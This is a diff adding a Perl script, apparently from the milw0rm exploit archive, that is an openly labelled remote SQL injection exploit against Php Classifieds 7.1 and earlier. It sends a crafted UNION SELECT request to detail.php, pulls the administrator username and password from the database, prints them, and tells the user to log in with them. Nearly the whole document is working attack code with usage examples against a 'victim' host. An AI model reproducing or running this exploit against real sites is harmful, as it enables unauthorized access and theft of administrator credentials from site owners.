@@ -1,0 +1,63 @@
+#!/usr/bin/perl
+#[Script Name: Php Classifieds <= 7.1 (detail.php) Remote SQL Injection Exploit
+#[Coded by   : ajann
+#[Author     : ajann
+#[Contact    : :(
+use IO::Socket;
+if(@ARGV < 3){
+print "
+[========================================================================
+[//  Php Classifieds <= 7.1 (detail.php) Remote SQL Injection Exploit
+[//           Usage: class.pl [target] [path] [userid]
+[//                   Example: class.pl victim.com / 1
+[//                   Example: class.pl victim.com /path/ 1
+[//                           Vuln&Exp : ajann
+[========================================================================
+";
+exit();
+}
+#Local variables
+$classifiedsserver = $ARGV[0];
+$classifiedsserver =~ s/(http:\/\/)//eg;
+$classifiedshost = "http://".$classifiedsserver;
+$classifiedsport = "80";
+$classifiedsdir = $ARGV[1];
+$classifiedsfile = "detail.php?id=1009&contact=1&user_id=";
+$classifiedsend = "member_login.php";
+$classifiedstarget = "1%20union%20select%20concat(adm_name,char(32),adm_pass)%20from%20phpclass_admins%20where%20adm_id%20like%20".$ARGV[2];
+$classifiedstarget = $classifiedshost.$classifiedsdir.$classifiedsfile.$classifiedstarget;
+#Writing data to socket
+print "+**********************************************************************+\n";
+print "+ Trying to connect: $classifiedsserver\n";
+$classifieds = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$classifiedsserver", PeerPort => "$classifiedsport") || die "\n+ Connection failed...\n";
+print $classifieds "GET $classifiedstarget\n";
+print $classifieds "Host: $classifiedsserver\n";
+print $classifieds "Accept: */*\n";
+print $classifieds "Connection: close\n\n";
+print "+ Connected!...\n";
+#Getting
+while($answer = <$classifieds>) {
+if ($answer =~ /<b>(.*?)<\/b>/){ 
+print "+ Exploit succeed! Getting admin information.\n";
+print "+ ---------------- +\n";
+print "+ Username and Password: $1\n";
+print "+ Lets go $classifiedshost$classifiedsdir$classifiedsend and\n+ Login with this information. \n";
+exit();
+}
+
+if ($answer =~ /Ad removed or not yet approved/) { 
+print "+ Exploit Failed : ( \n";
+print "+**********************************************************************+\n";
+exit(); 
+}
+
+if ($answer =~ /Internal Server Error/) {
+print "+ Exploit Failed : (  \n";
+print "+**********************************************************************+\n";
+exit(); 
+}
+}
+print "+ Exploit failed :(\n";
+print "+**********************************************************************+\n";
+
+# milw0rm.com [2006-11-05]
